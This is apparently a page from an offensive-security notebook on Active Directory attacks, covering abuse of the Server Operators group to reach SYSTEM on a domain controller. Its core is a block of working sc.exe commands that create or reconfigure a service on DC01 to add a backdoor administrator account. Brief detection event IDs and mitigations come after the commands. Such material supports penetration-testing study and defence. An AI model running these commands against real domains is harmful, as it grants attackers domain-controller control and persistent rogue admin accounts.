---
title: "Attack #51 — Abusing Server Operators Group"
description: "sc.exe \\\\DC01 create evilsvc binPath= \"cmd.exe /c net user hacker P@ss123! /add && net localgroup Administrators hacker /add\" start= auto sc.exe \\\\DC01…"
category: active-directory
subcategory: "Privilege & Group Abuse"
tags: ["active-directory", "adcs"]
tools: ["PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Six/🟣 Attack #51 — Abusing Server Operators Group.md"
---
# 🟣 Attack #51 — Abusing Server Operators Group

***

## 📖 How It Works

**Server Operators** can log on to Domain Controllers, start/stop services, manage shared resources, and backup/restore files. The critical escalation path: Server Operators can **modify and create Windows services** — allowing them to create a malicious service that runs as SYSTEM, achieving SYSTEM-level access on a DC.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Membership in Server Operators** | Can manage services on DCs |

***

## 💻 Full Commands

```powershell
# ── Create a malicious service ────────────────────────────────────────────────
sc.exe \\DC01 create evilsvc binPath= "cmd.exe /c net user hacker P@ss123! /add && net localgroup Administrators hacker /add" start= auto
sc.exe \\DC01 start evilsvc

# ── Or modify an existing service ─────────────────────────────────────────────
# Find a stoppable service:
sc.exe \\DC01 query type=own | findstr SERVICE_NAME
sc.exe \\DC01 config VSS binPath= "cmd.exe /c net localgroup Administrators low_user /add"
sc.exe \\DC01 stop VSS
sc.exe \\DC01 start VSS

# ── Cleanup ───────────────────────────────────────────────────────────────────
sc.exe \\DC01 delete evilsvc
# Or restore the original binPath
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **7045** | System Log (DC) | New service installed with suspicious binPath |
| **4697** | Security Log (DC) | Service installation |
| **4688** | Security Log (DC) | Process creation from service |

***

## 🔗 Attack Chain Context

```
[Server Operators] ──→ Service manipulation → SYSTEM on DC
         │
         ├──→ 🔗 Create/modify service → run as SYSTEM → DCSync
         └──→ 💀 Defeated by: empty Server Operators group, monitor 7045
```

***

> ✅ **Attack #51 — Server Operators complete.**
